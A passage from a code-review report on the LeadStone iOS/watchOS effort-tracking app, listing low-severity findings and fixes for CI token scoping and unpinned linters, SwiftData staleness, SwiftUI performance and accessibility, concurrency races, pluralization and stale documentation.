The lint step installs whatever versions of SwiftLint/SwiftFormat Homebrew currently publishes and immediately executes them over the checkout. A compromised or malicious formula/bottle would run arbitrary code inside the job (which, per the missing-permissions finding, may hold a write-scoped GITHUB_TOKEN). It also causes unreproducible CI: a new linter release with new rules can break every branch overnight with no code change, and CLAUDE.md tells developers to match "the same major versions CI installs", which is a moving target.

**Fix.** Pin the versions: install specific release binaries from the projects' GitHub releases by version + checksum (as done locally per CLAUDE.md), or use versioned formulae, so CI runs a known artifact.


<a id="f-34"></a>
#### 🔵 LOW · `.github/workflows/release.yml:52`

**`contents: write` granted workflow-wide, though only tag builds create releases**

The top-level `permissions: contents: write` applies to every run, including workflow_dispatch runs that never touch the 'Attach .ipa to GitHub Release' step (which is gated on `startsWith(github.ref, 'refs/tags/')`). Every step in every dispatch run — including third-party actions and xcodebuild-executed repo scripts — therefore holds a token that can push to the repository, create releases, and modify tags.

**Fix.** Since the workflow is single-job, keep write only where needed: set top-level `permissions: contents: read` and move the release-attach step into a separate job with `permissions: contents: write` (needs the IPA passed via artifact), or at minimum accept the tradeoff consciously and document it.



**SwiftData**

<a id="f-96"></a>
#### 🔵 LOW · `Shared/Services/SessionService.swift:46`

**startSession re-derives running state from metric.sessions — the exact staleness toggleSession's doc comment warns against**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: toggleSession's comment-only invariant violated by its own siblings.

toggleSession carries a detailed doc comment explaining that re-deriving the running session from `metric.sessions` is unsafe because the relationship "can lag a sibling context's save (e.g. an auto-stop)", and therefore the caller must pass the @Query-resolved session. Yet startSession, three lines below, guards with `activeSession(for: metric)`, which reads that same possibly-lagging relationship: a stale-running array makes startSession return the phantom session and never insert a new one — the documented failure ("play tap ... timer never starts") reproduced through the other door. toggleBinaryDay (line 159) and NotificationService.hasLoggedToday similarly derive today's state from metric.sessions. The good pattern (source of truth passed in by the caller) is applied in one API and quietly violated in its siblings.

**Fix.** Either accept an optional `runningSession:` in startSession the way toggleSession does (falling back to activeSession only for callers without a @Query), or fetch running sessions via `Session.isRunningPredicate` on the ambient context as reconcileCountdowns/nextCountdownEnd already do — that path reads the store, not the lagging relationship array.


<a id="f-97"></a>
#### 🔵 LOW · `Shared/Services/SharedModelContainer.swift:69`

**Silent documentsDirectory fallback when the app-group container is unavailable splits the store across processes**

storeURL falls back to `URL.documentsDirectory` when `containerURL(forSecurityApplicationGroupIdentifier:)` returns nil. That nil almost always means a misconfigured/missing app-group entitlement, and documentsDirectory is per-sandbox: the app, the widget extension, and the intents would each silently open a different (mostly empty) store instead of the shared one. The failure mode is invisible — widgets render zero data and watch actions write to a store the app never reads — rather than a loud, diagnosable error.

**Fix.** Treat a nil group URL as a configuration error: `assertionFailure` in debug builds and/or log prominently, so an entitlement regression on any of the three targets is caught immediately instead of manifesting as mysteriously empty widgets.


<a id="f-98"></a>
#### 🔵 LOW · `Shared/Services/StartTimerIntent.swift:25`

**Every intent invocation builds a fresh ModelContainer and re-runs the stable-ID backfill migration**

StartTimerIntent.perform, StopTimerIntent.perform (line 22), SelectMetricIntent and both widget providers each call SharedModelContainer.create(), and create() unconditionally runs backfillStableIDs — two predicate fetches plus a potential save — on every call (SharedModelContainer.swift:36-38). So a hidden write-capable migration executes on every widget button tap and every widget timeline reload, in the widget extension's tightly budgeted process. It also means container construction can throw because a migration save failed, aborting the user's start/stop action even though the store itself opened fine.

**Fix.** Cache the container per process (e.g. a static let shared = try? create() or a lazily-initialized accessor) and/or run backfillStableIDs only from the main app's launch path, not from the widget/intent factory.



**SwiftUI**

<a id="f-99"></a>
#### 🔵 LOW · `lead track/Views/AspirationFormView.swift:144`

**Icon-picker Menu label is image-only with no accessibility label**

The iconBadge Menu's label is just `Image(systemName: icon)`; VoiceOver will announce the raw SF Symbol description (e.g. 'mountain 2, button') with no hint that this button changes the aspiration's icon. The Picker inside is titled 'Icon', but the entry-point button itself is unnamed. Similarly the toolbar coverButton at line 212 is fine (it uses Label("Cover", ...)), showing the intended pattern.

**Fix.** Add `.accessibilityLabel("Icon")` (and optionally `.accessibilityValue` naming the current symbol) to the Menu label, or wrap it as `Label("Icon", systemImage: icon).labelStyle(.iconOnly)`.


<a id="f-100"></a>
#### 🔵 LOW · `lead track/Views/CalendarHeatmapView.swift:95`

**totalsByDay dictionary and maxValue are rebuilt for every one of the 112 grid cells**

totalsByDay and maxValue are computed properties, and color(for:) (line 123) reads both. color(for:) is invoked once per cell — 16 weeks x 7 days = 112 cells — so a single render constructs the Dictionary from dailyTotals and re-scans for the max 112 times each: O(cells x N) work in body for a view whose input can span years of daily totals. As a secondary fragility, Dictionary(uniqueKeysWithValues:) traps at runtime on duplicate dates; today's only producer (SessionStatistics.dailyTotals, verified) yields unique day keys, but nothing in this view's contract enforces that for future callers.

**Fix.** Compute the lookup once per render: hoist let totals = totalsByDay / let max = maxValue into body (or cache them in the grid builder) and pass them down to cell(for:). Use Dictionary(_:uniquingKeysWith:) so a duplicate date can never crash the view.


<a id="f-101"></a>
#### 🔵 LOW · `lead track/Views/ClusterMetricRow.swift:120`

**todayTotal scans the metric's entire session history several times within one row render**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: ClusterMetricRow.todayTotal full-scans the session history several times per render.

todayTotal calls SessionStatistics.todayTotal(from: metric.sessions), which iterates every session the metric has ever recorded. Within a single render of one row it is evaluated independently by todayValue (line 92/96), binaryButton (line 225/228 — twice), doneRow (line 138), and again inside GoalSummary.isDailyComplete's isDailyMet (row, line 44). That is up to four full scans of an unbounded relationship per row per render, multiplied across every expanded cluster row on the Today screen. The repo's recompute-fresh doctrine covers recomputing per render, but not recomputing the same figure multiple times inside one render.

**Fix.** Evaluate todayTotal once at the top of body (let total = todayTotal) and thread it into row/todayValue/binaryButton/doneRow, or cache it as a local in the row builder so each render performs a single pass over metric.sessions.


<a id="f-102"></a>
#### 🔵 LOW · `lead track/Views/MetricCardView.swift:18`

**Dashboard card builds the full all-time daily-totals history in body when only today's total is used**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: per-render full-history scan for a today-only value (but this view is DEAD, see C1).

body calls `SessionStatistics.dailyTotals(from: metric.sessions)` — which buckets the metric's entire session history into per-day totals — on every body evaluation of every card on the Today dashboard, but the card only ever consumes today's single entry (valueRow, todayValue, the progress fraction). SessionStatistics already provides a dedicated one-pass `todayTotal(from sessions:)` overload (Shared/Services/SessionStatistics.swift:85, documented as "without building the full per-day history first") written for exactly this case; `isDoneToday` (line 150) even uses it, so the same file mixes both approaches. On top of that, `todayTotal(from: totals)` is recomputed in three separate places per render (lines 30, 86, 91). For a long-lived metric with thousands of sessions and several cards on screen, this is repeated O(n) dictionary-bucketing work on the main thread for a value the code can get in one pass.

**Fix.** Compute `let today = SessionStatistics.todayTotal(from: metric.sessions)` once (the single-pass overload) and thread it through content/valueRow/todayValue instead of building `[DailyTotal]` per render.


<a id="f-103"></a>
#### 🔵 LOW · `lead track/Views/MetricFoldsCard.swift:71`

**Fold rows don't expose their expanded/collapsed state to accessibility, unlike the equivalent MetricLedgerCard header**

foldRow's disclosure button conveys open/closed only visually (chevron rotationEffect at line 93); VoiceOver hears just 'Activity, 26 weeks, button' with no way to know whether activating it will expand or collapse, or what state the fold is in. The codebase's own sibling pattern does this right: MetricLedgerCard.headerRow (MetricLedgerCard.swift:74) adds `.accessibilityHint(collapse.wrappedValue ? "Expand" : "Collapse")` on the identical fold affordance — a good pattern applied inconsistently. Elsewhere accessibility is handled carefully (MetricRingCard's accessibilitySummary, changeBadge's accessibilityLabel), which makes this gap stand out.

**Fix.** Mirror the ledger header: add `.accessibilityHint(isOpen.wrappedValue ? "Collapse" : "Expand")` (or better, `.accessibilityValue(isOpen.wrappedValue ? "expanded" : "collapsed")` plus `.accessibilityAddTraits(.isButton)`) to foldRow.


<a id="f-104"></a>
#### 🔵 LOW · `lead track/Views/MomentFormView.swift:225`

**Photo strip ForEach identified by array offset — unstable identity on a mutable collection**

`ForEach(Array(photoData.enumerated()), id: \.offset)` identifies rows by position in an array the user mutates: `removePhoto(at:)` deletes mid-array and `loadPhotos` appends. Removing photo 0 makes every remaining thumbnail change identity content (offset 0 now holds photo 1's data), so SwiftUI diffs this as 'last item removed, all others changed' — the delete animation plays on the wrong thumbnail and any in-flight transition/state attaches to the wrong photo. This is the classic unstable-ForEach-identity anti-pattern; it currently 'works' only because thumbnails are stateless.

**Fix.** Give each imported photo a stable identity — e.g. a small `struct PickedPhoto: Identifiable { let id = UUID(); let data: Data }` for the @State array — and `ForEach(photoData)` directly, deriving the index for removal via `firstIndex(where:)` or passing the element.


<a id="f-105"></a>
#### 🔵 LOW · `lead track/Views/ReminderScheduleEditor.swift:36`

**Index-based ForEach identity over a mutable fixedTimes array**

ForEach(schedule.fixedTimes.indices, id: \.self) gives rows positional identity while addFixedTime/removeFixedTime mutate the array. Removing a middle row shifts every later time into the previous row's identity, so SwiftUI reuses DatePicker state across logically different rows (visible as values jumping between rows on delete). The hand-rolled fixedTimeBinding guard (lines 62-75) exists purely to keep this from crashing, which is a symptom of the unstable identity rather than a fix.

**Fix.** Give each entry stable identity — e.g. store fixed times as small Identifiable structs (id: UUID, time: Date) in ReminderSchedule, or ForEach over Array(zip(...)) keyed on a stable id — which also removes the need for the guarded index bindings.


<a id="f-106"></a>
#### 🔵 LOW · `lead track/Views/WeeklyReviewView.swift:46`

**WeeklyReview.build runs inside body on every re-render, including for unrelated state changes**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: WeeklyReview.build runs inside body on every re-render.

body calls WeeklyReview.build over five full @Query result sets (metrics, aspirations, intentions, checkIns, moments — the moments query loads every Moment ever kept, sorted) on every evaluation. Purely cosmetic state changes — expanding a group card (expandedGroups), toggling the settings sheet, opening the goal-settings route — re-run the whole aggregation, and metricGroupsSection (line 120) plus WeeklyReview.weeklyGoalSegments (line 101) add further passes in the same render. Session/moment history grows without bound, so this cost scales with the lifetime of the account, and there is no seam to cache or test the assembled review independently of the view.

**Fix.** Compute the review once per (data, weeksBack) change rather than per render: derive it in a small @Observable view-model or cache it in @State refreshed via .task(id: weeksBack)/onChange of the query results, and pass the built WeeklyReview down to content/toolbar/groups.


<a id="f-107"></a>
#### 🔵 LOW · `lead-track Watch Widget/WatchGoalsWidget.swift:89`

**`line.percent ?? 0` papers over a nil that the pre-filtering was supposed to exclude, rendering a misleading permanent 0%**

goalLines() filters to hasActiveTarget, so percent "should" be non-nil — but the invariant leaks: a metric whose dailyGoal is exactly 0 passes hasDailyTarget (dailyGoal != nil) yet ComplicationMetricProgress.fraction returns nil (guard goal > 0), so percent is nil and the row displays a frozen "0%" regardless of activity, in both circularRow and rectangularRow (line 115). The `?? 0` turns "no computable progress" into "no progress", which are different statements. WatchMetricWidgetView handles the same nil correctly by falling back to the raw value label instead.

**Fix.** Either tighten the filter (require fraction != nil in goalLines) or render a placeholder such as "—" when percent is nil, mirroring WatchMetricWidgetView's fallback rather than defaulting to 0.


<a id="f-108"></a>
#### 🔵 LOW · `lead-track Widget/TimerActivityLiveActivity.swift:110`

**Lock-screen stop button is image-only with no accessibility label, inconsistent with the Dynamic Island variant**

The Dynamic Island stop button correctly uses `Label("Stop", systemImage: "stop.fill")` (line 82), so VoiceOver reads "Stop". The lock-screen presentation of the same action uses a bare `Image(systemName: "stop.fill")` inside the Button with no `accessibilityLabel`, so VoiceOver announces it as "stop fill" or nothing meaningful. A grep confirms zero `accessibilityLabel` usage anywhere in the widget target. This is the same good pattern applied inconsistently across two presentations of one control.

**Fix.** Use `Label("Stop", systemImage: "stop.fill").labelStyle(.iconOnly)` or add `.accessibilityLabel("Stop")` to the lock-screen button.



**complexity**

<a id="f-35"></a>
#### 🔵 LOW · `Shared/Models/Metric.swift:9`

**Metric is accreting into a god model: ~25 flat stored properties across six unrelated feature clusters**

Metric now carries identity/display (name, icon, colorName), goals (dailyGoal, weeklyGoal, excludedWeekdays), a six-field reminder cluster including a legacy field that every write must keep mirrored (reminderTime alongside reminderTimes/reminderRandomStart/reminderRandomEnd/reminderRandomCount/reminderUsesRandom), health mirroring (healthSourceRaw, lastHealthSyncAt), health export (healthExportRaw, healthExportEnabledAt), goal seasons (goalSeasonStartedAt, goalSeasonWeeks, goalSeasonNote), binary retirement (binaryGoalRetiredAt), and count-log style — plus five relationship arrays. The Metric+ReminderSchedule bridge is a good mitigation, but the invariants live in comments ("meaningless on non-count metrics", "mirrors the first fixed time into the legacy reminderTime") rather than in types, and each new feature adds another raw string + doc-comment. Any writer that bypasses applyReminderSchedule can silently break the legacy mirror.

**Fix.** Continue the bridge pattern but make it the only door: make the raw reminder fields fileprivate-in-module where possible, or group future feature clusters as Codable value-type attributes (SwiftData supports Codable struct properties) so one field per feature is added instead of three to six. At minimum, add a unit test asserting the reminderTime legacy mirror invariant so it cannot drift.


<a id="f-36"></a>
#### 🔵 LOW · `lead track/Services/MomentLocationReader.swift:74`

**Re-entrancy safety depends on a .disabled modifier in a distant view**

resolve() stores single-slot checked continuations (authContinuation/fixContinuation) with no guard against a second concurrent call: a re-entrant resolve() would overwrite the pending continuation, leaking it (the first caller's task suspends forever and Swift logs a continuation leak). Today this is only prevented because MomentFormView.swift:196 disables the chip while `locationStatus == .resolving` — a hidden contract enforced two files away from the class that would break. Any new call site (e.g. auto-tagging on save) reintroduces the hang.

**Fix.** Make the reader self-protective: guard at the top of resolve()/requestFix() — if a continuation is already pending, either resume the old one with nil or return .failed immediately — so the invariant lives with the state it protects.


<a id="f-37"></a>
#### 🔵 LOW · `lead track/Views/StatisticsView.swift:16`

**dailyTotals computed property re-aggregates all sessions five times per render**

dailyTotals is a computed property that runs SessionStatistics.dailyTotals(from: sessions) — a full pass over every session — and it is accessed once in body (line 21), once in weekPace (line 52), twice in statsContent (lines 66, 72), and once in weekItem (line 86), so each render aggregates the same session list up to five times. ProjectDetailView compounds this by calling SessionStatistics.dailyTotals independently again for its activity section (line 167) and detailed-stats sheet (line 67) on the same sessions.

**Fix.** Compute the totals once per render (e.g. `let totals = dailyTotals` at the top of body and pass it down, or accept precomputed [DailyTotal] as the view's input the way DetailedStatisticsView already does) so callers share one aggregation.



**concurrency**

<a id="f-38"></a>
#### 🔵 LOW · `.github/scripts/revoke-dev-certs.rb:54`

**Revokes every 'Created via API' development certificate account-wide, racing any concurrent signing run on the team**

development_certificates() lists /v1/certificates for the whole Apple team and revokes every DEVELOPMENT/IOS_DEVELOPMENT cert whose name contains 'Created via API' — including one that another repo/pipeline on the same team (or another concurrent run of this very workflow) minted moments ago and is about to sign with, making that run's Archive/Export fail mid-flight. Notably, release.yml's concurrency group is `release-${{ github.ref }}` (release.yml:56), so a tag push and a workflow_dispatch on a branch run in parallel: run B's 'Free up signing certificates' step can revoke the fresh cert run A's Archive just created. The name check is also a substring match (include?), not equality, so any cert whose name merely contains the phrase is reaped. Today this is a single-maintainer team so the blast radius is small, but the script is destructive account-wide with an Admin key and no age/ownership guard.

**Fix.** At minimum, exact-match the name (== or start_with?('Apple Development: Created via API')) and skip certificates created recently (certificates expose no creation date directly, but serial/expirationDate lets you keep the N newest, e.g. skip certs expiring latest). Also consider a single account-wide concurrency group for release.yml (group: release) so two release runs never interleave revoke/Archive.


<a id="f-39"></a>
#### 🔵 LOW · `Shared/Services/SessionService.swift:296`

**stopLiveActivity's fire-and-forget Task can race a subsequent startLiveActivity and end the new activity**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: stopLiveActivity's fire-and-forget Task ends the NEXT activity on a stop->start.

stopLiveActivity spawns an unstructured `Task { for activity in Activity<TimerActivityAttributes>.activities { await activity.end(...) } }` with no ordering guarantee relative to later calls. stopSession calls it synchronously, and a quick follow-up startSession calls startLiveActivity, whose `Activity.request` runs immediately (unlike syncLiveActivity, startLiveActivity has no `activities.isEmpty` guard). If the detached end-loop is scheduled after the new request, it enumerates `activities` — now containing the fresh one — and ends it, so the user's newly started timer loses its Live Activity until the next foreground sync. The `_ = try? Activity.request(...)` on line 288 additionally swallows ActivityKit errors (activities disabled, budget exhausted) with no trace.

**Fix.** Capture the set of activities to end before spawning the Task (or pass the specific activity), or make stop/start flow through one async path so ordering is defined; consider logging the Activity.request failure even if degrading silently is the policy.


<a id="f-40"></a>
#### 🔵 LOW · `lead track/Services/HealthMetricSyncService.swift:82`

**MainActor reentrancy: overlapping refresh passes can apply duplicate mirror plans**

refresh() computes `existingByDay` from a fresh ModelContext, suspends across `await reader.dayTotals(...)`, then applies insert/update/delete operations. Because the service is a @MainActor singleton, the actor is reentrant at that suspension point: connect() (metric-form save), refreshMetric() (detail view), and refreshAll() (fired as an unstructured `Task {}` on every scene activation in lead_trackApp.handle(phase:), with no coalescing or cancellation) can interleave. Two passes that both plan against the same pre-state and both apply `.insert(day, value)` create duplicate mirrored day-sessions for the same metric/day, inflating totals until the next sync deletes the extras. HealthSessionExportService has the same shape (suspension between pending() computation and stamping).

**Fix.** Serialize passes per service: keep a `private var refreshTask: Task<Void, Never>?` and either await/cancel the in-flight task or bail when one is running; alternatively coalesce triggers through a single AsyncStream consumer.


<a id="f-41"></a>
#### 🔵 LOW · `lead track/lead_trackApp.swift:81`

**Health export is launched exactly at .background as a fire-and-forget Task with no background execution time**

handle(phase:) kicks off `Task { await HealthSessionExportService.shared.exportAll(...) }` when the phase becomes .background. Without a UIBackgroundTask assertion the process is typically suspended within moments of backgrounding, freezing the task before the HealthKit authorization checks and writes complete; the awaits resume only on next foreground. The design self-heals (unstamped sessions retry), but the documented intent — "Leaving the app is the moment sessions completed while it was open get sent to Apple Health" — mostly does not happen; exports actually land on the next activation, and a session can sit unexported indefinitely if the user doesn't return.

**Fix.** Wrap the export in UIApplication.shared.beginBackgroundTask/endBackgroundTask (or ProcessInfo.performExpiringActivity) so the writes get their ~30s window, or trigger the export at .inactive instead of .background.


<a id="f-42"></a>
#### 🔵 LOW · `lead-track Watch App/WatchSyncController.swift:50`

**sendMessage errorHandler runs the fallback closure on WCSession's background queue without a MainActor hop, unlike the replyHandler**

In send(_:fallback:), the replyHandler carefully bounces to the main actor via Task { @MainActor in self?.receive(...) }, but the errorHandler invokes the captured `fallback` closure directly. WCSession invokes errorHandler on a background serial queue, so a closure formed in this implicitly-MainActor class (the watch target builds with SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor) executes off its actor. Today the only fallback is `{ WCSession.default.transferUserInfo(message) }` (thread-safe), so nothing breaks, but the same `fallback` parameter runs on MainActor in the guard path and on a background queue in the error path. Any future fallback that touches `snapshot` or other @Observable state becomes a silent data race, and the pattern is exactly what Swift 6 strict mode would reject; it compiles only because the target is in Swift 5 language mode.

**Fix.** Wrap the fallback invocation in the same hop used by the replyHandler: `errorHandler: { _ in Task { @MainActor in handler() } }` (or make `fallback` @Sendable and document that it may run off-main). Keeping both delivery paths on one isolation makes the closure contract uniform.



**idiom**

<a id="f-43"></a>
#### 🔵 LOW · `Shared/Services/NotificationService.swift:7`

**Legacy completion-handler notification APIs with all errors discarded**

requestPermission uses the callback form of requestAuthorization with `{ _, _ in }`, discarding both the granted flag and the error; the codebase otherwise targets iOS 26 with modern concurrency, where `try await center.requestAuthorization(options:)` is the idiom (HealthKitMetricReader/HealthKitSessionWriter already use the async authorization style). Likewise every `UNUserNotificationCenter.add(request)` call (lines 63 and 363) ignores the async error, so a rejected or malformed request — e.g. a trigger date computation gone wrong — disappears without a trace. The app can therefore never distinguish 'user denied notifications' from 'scheduling failed', and has no hook to update UI state after the permission prompt.

**Fix.** Adopt the async variants (`try await requestAuthorization`, `try await center.add(request)`) at least at the requestPermission entry point, returning/propagating the granted state so callers can react, and log add() failures even if the policy is to degrade silently.


<a id="f-44"></a>
#### 🔵 LOW · `Shared/Services/NotificationService.swift:240`

**Hand-built plural class: 'You logged 1 sessions across 1 metrics' and siblings bypass the pluralizing helpers that already exist**

The filed AspirationWeekDetailView '1 days' finding is one instance of a repo-wide class of unconditionally-pluralized interpolations. weeklyReviewBody (NotificationService.swift:240-242) produces "You logged 1 sessions (...) across 1 metrics this week." in a user-facing notification whenever the week has one session or one active metric. Other live instances: lead track/Views/DayDialView.swift:75 `"\(streak) days of showing up"` renders "1 days of showing up" on a day-1 streak, and Shared/Services/Insight.swift:206 `"\(current.sessions) sessions vs \(previous.sessions) last week"` renders "1 sessions". Notably ValueFormatter already ships correct helpers — `sessions(_:)` (ValueFormatter.swift:51) and `formatDays` (ValueFormatter.swift:34) — so these sites are bypassing an existing project idiom, not lacking one.

**Fix.** Sweep with `grep -rnE '\\\([a-zA-Z.]+\) (days|sessions|metrics|weeks)'` and route each hit through ValueFormatter (adding metrics/weeks helpers as needed), fixing the class in one pass instead of per-view findings. If localization ever lands, these become stringsdict/inflect cases automatically.


<a id="f-45"></a>
#### 🔵 LOW · `Shared/Services/WatchSnapshotBuilder.swift:36`

**snapshot(from:at:calendar:) accepts now/calendar but metricSnapshot ignores them**

The public entry point takes `at now: Date = .now` and `calendar: Calendar = .current` and uses them to stamp `day: calendar.startOfDay(for: now)` — but metricSnapshot(for:) computes `todayTotal: SessionStatistics.todayTotal(from: metric.sessions)` with the implicit defaults (.now and Calendar.current). The injected clock is silently dropped, so the snapshot's `day` field and its `todayTotal` values can describe different days: any test injecting a fixed `now` (the repo's documented midnight-anchored Linux-test pattern) gets totals for wall-clock today, and a snapshot built while the day rolls over is internally inconsistent — the exact skew WatchSnapshotReducer.rolledForward exists to prevent.

**Fix.** Thread `now` and `calendar` through metricSnapshot and into SessionStatistics.todayTotal (that overload already accepts a calendar; add/anchor the reference date too) so the whole snapshot is computed against one instant.


<a id="f-46"></a>
#### 🔵 LOW · `lead track/Views/AspirationWeekDetailView.swift:86`

**"1 days active" — unpluralized count sits next to a correctly pluralized one**

The hero caption interpolates ValueFormatter.sessions(week.sessionCount) — which handles the singular ("1 session", verified in Shared/Services/ValueFormatter.swift) — immediately followed by "\(week.activeDays) days active", which renders "1 days active" when one day was active. The codebase's own helper demonstrates the intended pattern; this string bypasses it. (More broadly, building user-facing copy as computed String properties opts these views out of Text's LocalizedStringKey/automatic-inflection handling, so pluralization must be manual everywhere.)

**Fix.** Add a ValueFormatter.days(_:) helper (or use ^[\(week.activeDays) days](inflect: true) in a Text literal) and use it here; audit sibling week-summary strings for the same singular case.


<a id="f-47"></a>
#### 🔵 LOW · `lead track/Views/DetailedStatisticsView.swift:257`

**String(format: "%.1f") ignores locale while the rest of the screen uses locale-aware formatting**

rateItem formats session-per-day rates with String(format: "%.1f", rate), which always emits a dot decimal separator regardless of locale, while adjacent stats on the same screen go through ValueFormatter/.formatted() and dates elsewhere use FormatStyle (locale-aware). A German-locale user sees "1.5" per day next to otherwise locale-correct values. Modern idiom is the FormatStyle API.

**Fix.** Use rate.formatted(.number.precision(.fractionLength(1))) so the decimal separator follows the user's locale and the screen is internally consistent.


<a id="f-48"></a>
#### 🔵 LOW · `lead track/Views/FormGridPickers.swift:20`

**IconGridPicker buttons lack the accessibility label and isSelected trait that ColorGridPicker (same file) applies**

ColorGridPicker.button (lines 70-71) correctly adds .accessibilityLabel(option.label) and .accessibilityAddTraits(selection == option ? .isSelected : []). IconGridPicker.button, twenty lines above it, is an image-only button with neither: VoiceOver users hear only the SF Symbol's derived name (often awkward or ambiguous, e.g. "figure.run") and get no indication of which icon is currently selected. This is the same shared-form-picker pattern implemented inconsistently within one file.

**Fix.** Mirror ColorGridPicker: add .accessibilityAddTraits(selection == option ? .isSelected : []) and, if symbol names are not self-describing, a human-readable .accessibilityLabel per option.


<a id="f-49"></a>
#### 🔵 LOW · `lead track/Views/MomentFormActions.swift:37`

**try? on loadTransferable makes photo-import failures invisible to the user**

`downscaledData(from:)` collapses a thrown loadTransferable error into nil, and loadPhotos silently skips nil results. A user who picks 3 photos and sees 1 appear (iCloud photo not downloaded, transferable failure, downscale failure) gets no feedback and no diagnostic trace — the tap simply did nothing. Same silent-failure idiom as the try? saves in MetricFormView; recoverable errors on user-initiated actions deserve at least a visible or logged outcome.

**Fix.** Catch the error explicitly (do/catch), log it, and consider surfacing a lightweight failure note in the composer (e.g. a count of photos that couldn't be imported) instead of dropping items silently.


<a id="f-50"></a>
#### 🔵 LOW · `lead track/Views/ProjectDetailView.swift:30`

**Query sorts sessions ascending only for completedSessions to re-sort them descending each render**

The @Query fetches with sort: \.startedAt (ascending), but the only ordered consumer, completedSessions, immediately re-sorts the filtered array descending in memory on every body evaluation. activeSession does not depend on order. The ascending fetch sort therefore buys nothing and the view pays an extra O(n log n) per render.

**Fix.** Sort descending in the Query (SortDescriptor(\.startedAt, order: .reverse)) and drop the in-memory .sorted, or at least replace the closure sort with .reversed() on the already-sorted result.



**maintainability**

<a id="f-51"></a>
#### 🔵 LOW · `CONTEXT.md:4`

**CONTEXT.md glossary is missing the shipped Principle concept and the Intention daily question**

CONTEXT.md states its purpose as 'This glossary pins the terms that are specific to the domain', and it covers every concept through Moments — but two shipped domain concepts postdate it. (1) Principle: Shared/Models/Principle.swift ('A short vow held under one aspiration ... intentions name the principle they serve, moments name the principle they live') plus Shared/Services/PrincipleLiving.swift (the 12-week living-underline record) and AspirationPrinciplesSection.swift shipped in PR #75; 'principle' appears zero times in CONTEXT.md. (2) The intention daily question (PR #77, IntentionQuestion model, NotificationService+IntentionQuestions with per-day one-shot notifications and aspiration deep links) is absent from the Intention entry (lines 73-78), which still describes intentions purely as week-scoped commitments; 'question' also has zero hits. New contributors using the glossary to pin terminology will not learn two first-class concepts, including the app's only per-intention notification surface.

**Fix.** Add a 'Principle' glossary entry (vow under exactly one aspiration; target-free; lived via intentions/moments naming it; the living underline counts weeks of service, never outcomes) and extend the Intention entry with the optional daily question and its notification window.


<a id="f-52"></a>
#### 🔵 LOW · `README.md:3`

**README opening line still describes the original Xcode template, not the shipping product**

Line 3 says the app is 'for managing timestamped items, built around a NavigationSplitView master-detail UI'. The shipping app is LeadStone (project.pbxproj sets INFOPLIST_KEY_CFBundleDisplayName = LeadStone), an effort-tracking product built on Metric/Project/Session with Aspirations, Intentions, Moments, Principles, goals/seasons, and weekly review. The UI is a page-style TabView with three tabs (Today / Week / Aspirations) driven by a custom AppTabBar ('lead track/ContentView.swift' lines 42-63); grep finds zero NavigationSplitView usages anywhere in the codebase. This is the first line a new contributor reads and it describes an app that no longer exists. CLAUDE.md's Project Overview repeats the same stale sentence ('NavigationSplitView-based master-detail UI for managing timestamped items') and should be fixed in the same pass.

**Fix.** Rewrite README line 3 (and the matching sentence in CLAUDE.md) to describe the actual product: LeadStone, a personal effort-tracking app (metrics, projects, sessions, aspirations, intentions, moments) with a three-tab page-style TabView UI, watchOS companion, and widgets. CONTEXT.md's opening paragraph is a good source.


<a id="f-53"></a>
#### 🔵 LOW · `README.md:29`

**README Project Layout omits two of the five targets and the Linux SwiftPM overlay**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: README/CLAUDE.md target inventory drifted (4 targets compile Shared/, docs say 3).

The Project Layout section (lines 27-33) lists five directories but the repo root also contains 'lead-track Watch Widget/' (watch complications/widget target, its own bundle ID plastickarma.lead-track.watchkitapp.widget) and 'lead trackUITests/'. It also never mentions Package.swift, the repo-root SwiftPM overlay that CLAUDE.md treats as the primary way to build and test domain logic off-Mac ('swift build' / 'swift test'), nor docs/ or scripts/. A reader orienting from the README gets an incomplete map of the targets and misses the only cross-platform build entry point.

**Fix.** Add 'lead-track Watch Widget/' and 'lead trackUITests/' to the layout list, and a line for Package.swift noting the Linux SwiftPM overlay with the swift build/test commands (or a pointer to CLAUDE.md's section).


<a id="f-54"></a>
#### 🔵 LOW · `Shared/Models/Intention.swift:154`

**Week identity via exact Date equality on persisted weekStart breaks on time-zone or firstWeekday changes**

isInCurrentWeek compares the persisted weekStart Date byte-for-byte against a freshly computed Calendar.current week start. The stored value was normalized with the calendar/time zone in effect at creation; if the user travels across time zones mid-week, or the locale's firstWeekday differs, the recomputed start is a different instant and every open intention silently falls out of "this week". AspirationCheckIn.weekStart documents the same convention for per-week dedup (AspirationCheckIn.swift:30), so the check-in composer would also stop finding the current week's row and create a duplicate. The type already owns weekInterval(calendar:), which would make this robust.

**Fix.** Replace the equality check with interval containment: `weekInterval(calendar: calendar).contains(now)` (respecting the half-open convention), and use the same containment for check-in dedup, so week membership survives time-zone and calendar-settings changes.


<a id="f-55"></a>
#### 🔵 LOW · `Shared/Models/Session.swift:70`

**countdownInterval logic triplicated across Session, TimerActivityAttributes, and WatchMetricSnapshot**

The identical computation — guard countdownDuration > 0, then `start ... start.addingTimeInterval(target)` — appears three times: Session.countdownInterval (Session.swift:70-73), TimerActivityAttributes.countdownInterval(startedAt:) (TimerActivityAttributes.swift:19-22), and WatchMetricSnapshot.countdownInterval (WatchSnapshot.swift:78-81). If the countdown display rule ever changes (e.g. clamping, grace period), three call sites must change in lockstep across three targets; the repo already centralizes exactly this kind of shared display math (e.g. Session.isRunningPredicate 'so queries and isRunning can never drift apart').

**Fix.** Hoist one free function or a small extension in Shared, e.g. `func countdownInterval(startedAt: Date, duration: TimeInterval?) -> ClosedRange<Date>?`, and have all three computed properties delegate to it. It is platform-neutral Foundation code, so it fits the SwiftPM overlay with no exclusions.


<a id="f-56"></a>
#### 🔵 LOW · `Shared/Models/WatchSnapshot.swift:107`

**Weekday-exclusion rule hand-implemented in three places**

